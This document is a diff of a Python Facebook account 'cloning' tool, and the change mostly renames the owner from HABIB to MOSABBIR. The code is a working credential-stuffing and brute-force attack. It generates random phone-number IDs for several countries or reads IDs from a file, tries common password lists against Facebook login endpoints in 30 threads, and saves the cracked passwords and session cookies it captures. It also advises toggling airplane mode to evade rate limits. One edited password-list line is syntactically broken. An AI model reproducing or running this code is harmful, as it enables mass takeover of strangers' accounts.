@@ -51,7 +51,7 @@ def fuckx():
 	return ufff
 #──────────────{ LOGO }──────────────#
 logo = f"""
-     {A} _     _ _______ ______  _____ ______ \n     {A} |_____| |_____| |_____]   |   |_____]\n     {A} |     | |     | |_____] __|__ |_____]\n{A}─────────────────────────────────────────────────\n{A}|=| OWNER   : HABIB HOSSAIN\n{A}|=| TOOL    : FILE/RANDOM/GMAIL CLONING\n{A}|=| VERSION : 0.0\n{A}─────────────────────────────────────────────────"""
+     {A} _     _ _______ ______  _____ ______ \n     {A} |_____| |_____| |_____]   |   |_____]\n     {A} |     | |     | |_____] __|__ |_____]\n{A}─────────────────────────────────────────────────\n{A}|=| OWNER   : MOSABBIR HOSSAIN\n{A}|=| TOOL    : FILE/RANDOM/GMAIL CLONING\n{A}|=| VERSION : 0.0\n{A}─────────────────────────────────────────────────"""
 #──────────────{ MENU }──────────────#
 def menu():
     clear()
@@ -65,7 +65,7 @@ def menu():
 #──────────────{ FILE }──────────────#
 def __Filex__():
     clear()
-    print(f"{A}|=| EXAMPLE : /sdcard/HABIB.txt ");linex();dfile = input(f'{A}|?| CHOICE  : ')
+    print(f"{A}|=| EXAMPLE : /sdcard/MOSABBIR.txt ");linex();dfile = input(f'{A}|?| CHOICE  : ')
     try:
         dx = open(dfile,'r').read().splitlines()
     except FileNotFoundError:
@@ -82,26 +82,26 @@ def __Filex__():
     print(f"{A}|=| EXAMPLE : firstlast | first123 |ETC| ");linex()
     for i in range(pass_lmit):
         dplist.append(input(f'{A}|=| PASSWORD NO.{i+1} :{G} '))
-    with ThreadPool(max_workers=30) as habibx:
+    with ThreadPool(max_workers=30) as MOSABBIRx:
         clear();total_ids = str(len(dx))
         print(f"{A}|=| FILE UID {G}|{A} PASSWORD :{G} {total_ids} {G}|{Y} {pass_lmit} ");print(f"{A}|=| USE AIRPLANE MODE EVERY 5 MINTS ");linex()
         for user in dx:
             ids,names = user.split('|')
             passlist = dplist
-            if methodx in ['1']:habibx.submit(__file_M1__,ids,names,passlist)
-            if methodx in ['2']:habibx.submit(__file_M2__,ids,names,passlist)
-            if methodx in ['3']:habibx.submit(__file_M3__,ids,names,passlist)
-            if methodx in ['4']:habibx.submit(__file_M4__,ids,names,passlist)
-            if methodx in ['5']:habibx.submit(__file_M5__,ids,names,passlist)
-            if methodx in ['6']:habibx.submit(__file_M6__,ids,names,passlist)
-            if methodx in ['7']:habibx.submit(__file_M7__,ids,names,passlist)
-            if methodx in ['8']:habibx.submit(__file_M8__,ids,names,passlist)
+            if methodx in ['1']:MOSABBIRx.submit(__file_M1__,ids,names,passlist)
+            if methodx in ['2']:MOSABBIRx.submit(__file_M2__,ids,names,passlist)
+            if methodx in ['3']:MOSABBIRx.submit(__file_M3__,ids,names,passlist)
+            if methodx in ['4']:MOSABBIRx.submit(__file_M4__,ids,names,passlist)
+            if methodx in ['5']:MOSABBIRx.submit(__file_M5__,ids,names,passlist)
+            if methodx in ['6']:MOSABBIRx.submit(__file_M6__,ids,names,passlist)
+            if methodx in ['7']:MOSABBIRx.submit(__file_M7__,ids,names,passlist)
+            if methodx in ['8']:MOSABBIRx.submit(__file_M8__,ids,names,passlist)
     print('');print(f'\n{A}─────────────────────────────────────────────────');print(f"{A}|=| CLONING COMPLETE ");print(f"{A}|=| TOTAL OK ID :{G} {len(oks)}");print(f"{A}|=| TOTAL CP ID :{R} {len(cps)}");print(f'\n{A}─────────────────────────────────────────────────');exit()
 #──────────────{ FILE-METHOD-M1 }──────────────#
 def __file_M1__(ids,names,passlist):
     try:
         global loop,oks,cps
-        sys.stdout.write(f'\r\r{A}|HABIB-M1| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
+        sys.stdout.write(f'\r\r{A}|MOSABBIR-M1| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
         fn = names.split(' ')[0]
         try:
             ln = names.split(' ')[1]
@@ -115,14 +115,14 @@ def __file_M1__(ids,names,passlist):
             if "session_key" in po:
                 token = po['access_token']
                 session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
-                print(f'\r\r\x1b[38;5;46m|HABIB-OK| '+ids+' | '+pas)
+                print(f'\r\r\x1b[38;5;46m|MOSABBIR-OK| '+ids+' | '+pas)
                 print(f'\r\r\x1b[38;5;46m|COKI-OK| {cookie}\n')
-                open('/sdcard/HABIB-M1-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
+                open('/sdcard/MOSABBIR-M1-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                 oks.append(ids)
                 break
             elif 'www.facebook.com' in po['error']['message']:
-                print(f'\r\r{R}|HABIB-CP| '+ids+f' | '+pas)
-                open('/sdcard/HABIB-M1-CP.txt','a').write(ids+'|'+pas+'\n')
+                print(f'\r\r{R}|MOSABBIR-CP| '+ids+f' | '+pas)
+                open('/sdcard/MOSABBIR-M1-CP.txt','a').write(ids+'|'+pas+'\n')
                 cps.append(ids)
                 break
         loop+=1
@@ -134,7 +134,7 @@ def __file_M1__(ids,names,passlist):
 def __file_M2__(ids,names,passlist):
     try:
         global loop,oks,cps
-        sys.stdout.write(f'\r\r{A}|HABIB-M2| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
+        sys.stdout.write(f'\r\r{A}|MOSABBIR-M2| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
         fn = names.split(' ')[0]
         try:
             ln = names.split(' ')[1]
@@ -148,14 +148,14 @@ def __file_M2__(ids,names,passlist):
             if "session_key" in po:
                 token = po['access_token']
                 session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
-                print(f'\r\r\x1b[38;5;46m|HABIB-OK| '+ids+' | '+pas)
+                print(f'\r\r\x1b[38;5;46m|MOSABBIR-OK| '+ids+' | '+pas)
                 print(f'\r\r\x1b[38;5;46m|COKI-OK| {cookie}\n')
-                open('/sdcard/HABIB-M2-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
+                open('/sdcard/MOSABBIR-M2-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                 oks.append(ids)
                 break
             elif 'www.facebook.com' in po['error']['message']:
-                print(f'\r\r{R}|HABIB-CP| '+ids+f' | '+pas)
-                open('/sdcard/HABIB-M2-CP.txt','a').write(ids+'|'+pas+'\n')
+                print(f'\r\r{R}|MOSABBIR-CP| '+ids+f' | '+pas)
+                open('/sdcard/MOSABBIR-M2-CP.txt','a').write(ids+'|'+pas+'\n')
                 cps.append(ids)
                 break
         loop+=1
@@ -167,7 +167,7 @@ def __file_M2__(ids,names,passlist):
 def __file_M3__(ids,names,passlist):
     try:
         global loop,oks,cps
-        sys.stdout.write(f'\r\r{A}|HABIB-M3| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
+        sys.stdout.write(f'\r\r{A}|MOSABBIR-M3| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
         fn = names.split(' ')[0]
         try:
             ln = names.split(' ')[1]
@@ -181,14 +181,14 @@ def __file_M3__(ids,names,passlist):
             if "session_key" in po:
                 token = po['access_token']
                 session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
-                print(f'\r\r\x1b[38;5;46m|HABIB-OK| '+ids+' | '+pas)
+                print(f'\r\r\x1b[38;5;46m|MOSABBIR-OK| '+ids+' | '+pas)
                 print(f'\r\r\x1b[38;5;46m|COKI-OK| {cookie}\n')
-                open('/sdcard/HABIB-M3-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
+                open('/sdcard/MOSABBIR-M3-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                 oks.append(ids)
                 break
             elif 'www.facebook.com' in po['error']['message']:
-                print(f'\r\r{R}|HABIB-CP| '+ids+f' | '+pas)
-                open('/sdcard/HABIB-M3-CP.txt','a').write(ids+'|'+pas+'\n')
+                print(f'\r\r{R}|MOSABBIR-CP| '+ids+f' | '+pas)
+                open('/sdcard/MOSABBIR-M3-CP.txt','a').write(ids+'|'+pas+'\n')
                 cps.append(ids)
                 break
         loop+=1
@@ -200,7 +200,7 @@ def __file_M3__(ids,names,passlist):
 def __file_M4__(ids,names,passlist):
     try:
         global loop,oks,cps
-        sys.stdout.write(f'\r\r{A}|HABIB-M4| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
+        sys.stdout.write(f'\r\r{A}|MOSABBIR-M4| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
         fn = names.split(' ')[0]
         try:
             ln = names.split(' ')[1]
@@ -214,14 +214,14 @@ def __file_M4__(ids,names,passlist):
             if "session_key" in po:
                 token = po['access_token']
                 session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
-                print(f'\r\r\x1b[38;5;46m|HABIB-OK| '+ids+' | '+pas)
+                print(f'\r\r\x1b[38;5;46m|MOSABBIR-OK| '+ids+' | '+pas)
                 print(f'\r\r\x1b[38;5;46m|COKI-OK| {cookie}\n')
-                open('/sdcard/HABIB-M4-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
+                open('/sdcard/MOSABBIR-M4-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                 oks.append(ids)
                 break
             elif 'www.facebook.com' in po['error']['message']:
-                print(f'\r\r{R}|HABIB-CP| '+ids+f' | '+pas)
-                open('/sdcard/HABIB-M4-CP.txt','a').write(ids+'|'+pas+'\n')
+                print(f'\r\r{R}|MOSABBIR-CP| '+ids+f' | '+pas)
+                open('/sdcard/MOSABBIR-M4-CP.txt','a').write(ids+'|'+pas+'\n')
                 cps.append(ids)
                 break
         loop+=1
@@ -233,7 +233,7 @@ def __file_M4__(ids,names,passlist):
 def __file_M5__(ids,names,passlist):
     try:
         global loop,oks,cps
-        sys.stdout.write(f'\r\r{A}|HABIB-M5| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
+        sys.stdout.write(f'\r\r{A}|MOSABBIR-M5| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
         fn = names.split(' ')[0]
         try:
             ln = names.split(' ')[1]
@@ -247,14 +247,14 @@ def __file_M5__(ids,names,passlist):
             if "session_key" in po:
                 token = po['access_token']
                 session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
-                print(f'\r\r\x1b[38;5;46m|HABIB-OK| '+ids+' | '+pas)
+                print(f'\r\r\x1b[38;5;46m|MOSABBIR-OK| '+ids+' | '+pas)
                 print(f'\r\r\x1b[38;5;46m|COKI-OK| {cookie}\n')
-                open('/sdcard/HABIB-M5-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
+                open('/sdcard/MOSABBIR-M5-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                 oks.append(ids)
                 break
             elif 'www.facebook.com' in po['error']['message']:
-                print(f'\r\r{R}|HABIB-CP| '+ids+f' | '+pas)
-                open('/sdcard/HABIB-M5-CP.txt','a').write(ids+'|'+pas+'\n')
+                print(f'\r\r{R}|MOSABBIR-CP| '+ids+f' | '+pas)
+                open('/sdcard/MOSABBIR-M5-CP.txt','a').write(ids+'|'+pas+'\n')
                 cps.append(ids)
                 break
         loop+=1
@@ -266,7 +266,7 @@ def __file_M5__(ids,names,passlist):
 def __file_M6__(ids,names,passlist):
     try:
         global loop,oks,cps
-        sys.stdout.write(f'\r\r{A}|HABIB-M6| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
+        sys.stdout.write(f'\r\r{A}|MOSABBIR-M6| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
         fn = names.split(' ')[0]
         try:
             ln = names.split(' ')[1]
@@ -280,14 +280,14 @@ def __file_M6__(ids,names,passlist):
             if "session_key" in po:
                 token = po['access_token']
                 session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
-                print(f'\r\r\x1b[38;5;46m|HABIB-OK| '+ids+' | '+pas)
+                print(f'\r\r\x1b[38;5;46m|MOSABBIR-OK| '+ids+' | '+pas)
                 print(f'\r\r\x1b[38;5;46m|COKI-OK| {cookie}\n')
-                open('/sdcard/HABIB-M6-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
+                open('/sdcard/MOSABBIR-M6-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                 oks.append(ids)
                 break
             elif 'www.facebook.com' in po['error']['message']:
-                print(f'\r\r{R}|HABIB-CP| '+ids+f' | '+pas)
-                open('/sdcard/HABIB-M6-CP.txt','a').write(ids+'|'+pas+'\n')
+                print(f'\r\r{R}|MOSABBIR-CP| '+ids+f' | '+pas)
+                open('/sdcard/MOSABBIR-M6-CP.txt','a').write(ids+'|'+pas+'\n')
                 cps.append(ids)
                 break
         loop+=1
@@ -299,7 +299,7 @@ def __file_M6__(ids,names,passlist):
 def __file_M7__(ids,names,passlist):
     try:
         global loop,oks,cps
-        sys.stdout.write(f'\r\r{A}|HABIB-M7| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
+        sys.stdout.write(f'\r\r{A}|MOSABBIR-M7| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
         fn = names.split(' ')[0]
         try:
             ln = names.split(' ')[1]
@@ -313,14 +313,14 @@ def __file_M7__(ids,names,passlist):
             if "session_key" in po:
                 token = po['access_token']
                 session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
-                print(f'\r\r\x1b[38;5;46m|HABIB-OK| '+ids+' | '+pas)
+                print(f'\r\r\x1b[38;5;46m|MOSABBIR-OK| '+ids+' | '+pas)
                 print(f'\r\r\x1b[38;5;46m|COKI-OK| {cookie}\n')
-                open('/sdcard/HABIB-M7-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
+                open('/sdcard/MOSABBIR-M7-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                 oks.append(ids)
                 break
             elif 'www.facebook.com' in po['error']['message']:
-                print(f'\r\r{R}|HABIB-CP| '+ids+f' | '+pas)
-                open('/sdcard/HABIB-M7-CP.txt','a').write(ids+'|'+pas+'\n')
+                print(f'\r\r{R}|MOSABBIR-CP| '+ids+f' | '+pas)
+                open('/sdcard/MOSABBIR-M7-CP.txt','a').write(ids+'|'+pas+'\n')
                 cps.append(ids)
                 break
         loop+=1
@@ -331,7 +331,7 @@ def __file_M7__(ids,names,passlist):
 #──────────────{ FILE-METHOD-M8 }──────────────#
 def __file_M8__(ids,names,passlist):
 	global loop,oks,cps
-	sys.stdout.write(f'\r\r{A}|HABIB-M8| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
+	sys.stdout.write(f'\r\r{A}|MOSABBIR-M8| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
 	session = requests.Session()
 	try:
 		first = names.split(' ')[0]
@@ -348,18 +348,18 @@ def __file_M8__(ids,names,passlist):
 			getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
 			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
 			complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-			habibxd=session.cookies.get_dict().keys()
-			if "c_user" in habibxd:
+			MOSABBIRxd=session.cookies.get_dict().keys()
+			if "c_user" in MOSABBIRxd:
 				coki=session.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-				print(f'\r\r\x1b[38;5;46m|HABIB-OK| '+ids+' | '+pas)
+				print(f'\r\r\x1b[38;5;46m|MOSABBIR-OK| '+ids+' | '+pas)
 				print(f'\r\r\x1b[38;5;46m|COKI-OK| {cookie}\n')
-				open('/sdcard/HABIB-M7-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
+				open('/sdcard/MOSABBIR-M7-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
 				oks.append(ids)
 				break
-			elif 'checkpoint' in habibxd:
-				print(f'\r\r{R}|HABIB-CP| '+ids+' | '+pas)
-				open('/sdcard/HABIB-M8-CP.txt','a').write(ids+'|'+pas+'\n')
+			elif 'checkpoint' in MOSABBIRxd:
+				print(f'\r\r{R}|MOSABBIR-CP| '+ids+' | '+pas)
+				open('/sdcard/MOSABBIR-M8-CP.txt','a').write(ids+'|'+pas+'\n')
 				cps.append(ids)
 				break
 			else:
@@ -394,18 +394,18 @@ def __bdx__():
     for nmbr in range(limit):
         nmp=''.join(random.choice(string.digits) for _ in range(8))
         user.append(nmp)
-    with ThreadPool(max_workers=30) as Habibx:
+    with ThreadPool(max_workers=30) as MOSABBIRx:
         clear()
         tl=str(len(user))
         print(f'{A}|=| RANDOM UID : {tl} ');print(f'{A}|=| SIM CODE   : {code} ');print(f"{A}|=| USE AIRPLANE MODE EVERY 5 MINTS ");linex()
         for love in user:
             ids=code+love
-            passlist=[love,ids,ids[:7],ids[:6],ids[5:],ids[4:],'sadiya','jannat']
-            if methodx in ['1']:Habibx.submit(__Randm_M1__,ids,passlist)
-            if methodx in ['2']:Habibx.submit(__Randm_M2__,ids,passlist)
-            if methodx in ['3']:Habibx.submit(__Randm_M3__,ids,passlist)
-            if methodx in ['4']:Habibx.submit(__Randm_M4__,ids,passlist)
-            if methodx in ['5']:Habibx.submit(__Randm_M5__,ids,passlist)
+            passlist=[love,ids,ids[:7],ids[:6],ids[5:],ids[4:],'iloveyou','Bangladesh','bangladesh','iloveyou','889900','135790',']
+            if methodx in ['1']:MOSABBIRx.submit(__Randm_M1__,ids,passlist)
+            if methodx in ['2']:MOSABBIRx.submit(__Randm_M2__,ids,passlist)
+            if methodx in ['3']:MOSABBIRx.submit(__Randm_M3__,ids,passlist)
+            if methodx in ['4']:MOSABBIRx.submit(__Randm_M4__,ids,passlist)
+            if methodx in ['5']:MOSABBIRx.submit(__Randm_M5__,ids,passlist)
     print('');print(f'\n{A}─────────────────────────────────────────────────');print(f"{A}|=| CLONING COMPLETE ");print(f"{A}|=| TOTAL OK ID :{G} {len(oks)}");print(f"{A}|=| TOTAL CP ID :{R} {len(cps)}");print(f'\n{A}─────────────────────────────────────────────────');exit()
 #──────────────{ RANDOM-INDIA }──────────────#
 def __india__():
@@ -423,18 +423,18 @@ def __india__():
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(7))
         user.append(nmp)
-    with ThreadPool(max_workers=30) as Habibx:
+    with ThreadPool(max_workers=30) as MOSABBIRx:
         clear()
         tl=str(len(user))
         print(f'{A}|=| RANDOM UID : {tl} ');print(f'{A}|=| SIM CODE   : {code} ');print(f"{A}|=| USE AIRPLANE MODE EVERY 5 MINTS ");linex()
         for love in user:
             ids=code+love
             passlist=[love,ids,ids[:7],ids[:6],love[1:],"57273200","5757575"]
-            if methodx in ['1']:Habibx.submit(__Randm_M1__,ids,passlist)
-            if methodx in ['2']:Habibx.submit(__Randm_M2__,ids,passlist)
-            if methodx in ['3']:Habibx.submit(__Randm_M3__,ids,passlist)
-            if methodx in ['4']:Habibx.submit(__Randm_M4__,ids,passlist)
-            if methodx in ['5']:Habibx.submit(__Randm_M5__,ids,passlist)
+            if methodx in ['1']:MOSABBIRx.submit(__Randm_M1__,ids,passlist)
+            if methodx in ['2']:MOSABBIRx.submit(__Randm_M2__,ids,passlist)
+            if methodx in ['3']:MOSABBIRx.submit(__Randm_M3__,ids,passlist)
+            if methodx in ['4']:MOSABBIRx.submit(__Randm_M4__,ids,passlist)
+            if methodx in ['5']:MOSABBIRx.submit(__Randm_M5__,ids,passlist)
     print('');print(f'\n{A}─────────────────────────────────────────────────');print(f"{A}|=| CLONING COMPLETE ");print(f"{A}|=| TOTAL OK ID :{G} {len(oks)}");print(f"{A}|=| TOTAL CP ID :{R} {len(cps)}");print(f'\n{A}─────────────────────────────────────────────────');exit()
 #──────────────{ RANDOM-NEPAL }──────────────#
 def __nepalx__():
@@ -452,18 +452,18 @@ def __nepalx__():
     for nmbr in range(limit):
         nmp = "". join(random.choice(string.digits) for _ in range(6))
         user.append(nmp)
-    with ThreadPool(max_workers=30) as Habibx:
+    with ThreadPool(max_workers=30) as MOSABBIRx:
         clear()
         tl=str(len(user))
         print(f'{A}|=| RANDOM UID : {tl} ');print(f'{A}|=| SIM CODE   : {code} ');print(f"{A}|=| USE AIRPLANE MODE EVERY 5 MINTS ");linex()
         for love in user:
             ids=code+love
             passlist=[ids,love,ids[:8],ids[:7],ids[:6],'nepal12','nepal123','nepal1234','nepal12345','maya123','kathmandu','pokhara','tamang','maya1234','tamang123','tamang12345','nepal@123','kathmandu123']
-            if methodx in ['1']:Habibx.submit(__Randm_M1__,ids,passlist)
-            if methodx in ['2']:Habibx.submit(__Randm_M2__,ids,passlist)
-            if methodx in ['3']:Habibx.submit(__Randm_M3__,ids,passlist)
-            if methodx in ['4']:Habibx.submit(__Randm_M4__,ids,passlist)
-            if methodx in ['5']:Habibx.submit(__Randm_M5__,ids,passlist)
+            if methodx in ['1']:MOSABBIRx.submit(__Randm_M1__,ids,passlist)
+            if methodx in ['2']:MOSABBIRx.submit(__Randm_M2__,ids,passlist)
+            if methodx in ['3']:MOSABBIRx.submit(__Randm_M3__,ids,passlist)
+            if methodx in ['4']:MOSABBIRx.submit(__Randm_M4__,ids,passlist)
+            if methodx in ['5']:MOSABBIRx.submit(__Randm_M5__,ids,passlist)
     print('');print(f'\n{A}─────────────────────────────────────────────────');print(f"{A}|=| CLONING COMPLETE ");print(f"{A}|=| TOTAL OK ID :{G} {len(oks)}");print(f"{A}|=| TOTAL CP ID :{R} {len(cps)}");print(f'\n{A}─────────────────────────────────────────────────');exit()
 #──────────────{ RANDOM-PAKISTAN }──────────────#
 def __pakistan__():
@@ -481,18 +481,18 @@ def __pakistan__():
     for nmbr in range(limit):
         nmp = "". join(random.choice(string.digits) for _ in range(7))
         user.append(nmp)
-    with ThreadPool(max_workers=30) as Habibx:
+    with ThreadPool(max_workers=30) as MOSABBIRx:
         clear()
         tl=str(len(user))
         print(f'{A}|=| RANDOM UID : {tl} ');print(f'{A}|=| SIM CODE   : {code} ');print(f"{A}|=| USE AIRPLANE MODE EVERY 5 MINTS ");linex()
         for love in user:
             ids=code+love
             passlist=[love,ids,'khankhan','khan1122','ali12345','khanbaba','pakistan','khan12345','ali1122','khankhan12345','khan','baloch','pubg','pubg1122']
-            if methodx in ['1']:Habibx.submit(__Randm_M1__,ids,passlist)
-            if methodx in ['2']:Habibx.submit(__Randm_M2__,ids,passlist)
-            if methodx in ['3']:Habibx.submit(__Randm_M3__,ids,passlist)
-            if methodx in ['4']:Habibx.submit(__Randm_M4__,ids,passlist)
-            if methodx in ['5']:Habibx.submit(__Randm_M5__,ids,passlist)
+            if methodx in ['1']:MOSABBIRx.submit(__Randm_M1__,ids,passlist)
+            if methodx in ['2']:MOSABBIRx.submit(__Randm_M2__,ids,passlist)
+            if methodx in ['3']:MOSABBIRx.submit(__Randm_M3__,ids,passlist)
+            if methodx in ['4']:MOSABBIRx.submit(__Randm_M4__,ids,passlist)
+            if methodx in ['5']:MOSABBIRx.submit(__Randm_M5__,ids,passlist)
     print('');print(f'\n{A}─────────────────────────────────────────────────');print(f"{A}|=| CLONING COMPLETE ");print(f"{A}|=| TOTAL OK ID :{G} {len(oks)}");print(f"{A}|=| TOTAL CP ID :{R} {len(cps)}");print(f'\n{A}─────────────────────────────────────────────────');exit()
 #──────────────{ RANDOM-AFGHANISTAN }──────────────#
 def __afghanistanx__():
@@ -510,24 +510,24 @@ def __afghanistanx__():
     for nmbr in range(limit):
         nmp = "". join(random.choice(string.digits) for _ in range(7))
         user.append(nmp)
-    with ThreadPool(max_workers=30) as Habibx:
+    with ThreadPool(max_workers=30) as MOSABBIRx:
         clear()
         tl=str(len(user))
         print(f'{A}|=| RANDOM UID : {tl} ');print(f'{A}|=| SIM CODE   : {code} ');print(f"{A}|=| USE AIRPLANE MODE EVERY 5 MINTS ");linex()
         for love in user:
             ids=code+love
             passlist=[love,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹','Û±Û³Û³Û³ÛµÛ¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
-            if methodx in ['1']:Habibx.submit(__Randm_M1__,ids,passlist)
-            if methodx in ['2']:Habibx.submit(__Randm_M2__,ids,passlist)
-            if methodx in ['3']:Habibx.submit(__Randm_M3__,ids,passlist)
-            if methodx in ['4']:Habibx.submit(__Randm_M4__,ids,passlist)
-            if methodx in ['5']:Habibx.submit(__Randm_M5__,ids,passlist)
+            if methodx in ['1']:MOSABBIRx.submit(__Randm_M1__,ids,passlist)
+            if methodx in ['2']:MOSABBIRx.submit(__Randm_M2__,ids,passlist)
+            if methodx in ['3']:MOSABBIRx.submit(__Randm_M3__,ids,passlist)
+            if methodx in ['4']:MOSABBIRx.submit(__Randm_M4__,ids,passlist)
+            if methodx in ['5']:MOSABBIRx.submit(__Randm_M5__,ids,passlist)
     print('');print(f'\n{A}─────────────────────────────────────────────────');print(f"{A}|=| CLONING COMPLETE ");print(f"{A}|=| TOTAL OK ID :{G} {len(oks)}");print(f"{A}|=| TOTAL CP ID :{R} {len(cps)}");print(f'\n{A}─────────────────────────────────────────────────');exit()
 #──────────────{ GMAIL }──────────────#
 def __Gmailx__():
     clear()
     user=[]
-    print(f"{A}|=| EXAMPLE : Habib/Shakib/Rakib/Sumon ");linex();first = input(f'{A}|?| FIRST NAME  : ')
+    print(f"{A}|=| EXAMPLE : MOSABBIR/Shakib/Rakib/Sumon ");linex();first = input(f'{A}|?| FIRST NAME  : ')
     clear()
     print(f"{A}|=| EXAMPLE : Hossain/Khan/Ali/Islam ");linex();last = input(f'{A}|?| LAST NAME  : ')
     period = '.'
@@ -539,19 +539,19 @@ def __Gmailx__():
     for nmbr in range(limit):
         nmp="".join(random.choice(string.digits) for _ in range(1,4))
         user.append(nmp)
-    with ThreadPool(max_workers=30) as habibxxxx:
+    with ThreadPool(max_workers=30) as MOSABBIRxxxx:
         total=str(len(user))
         clear()
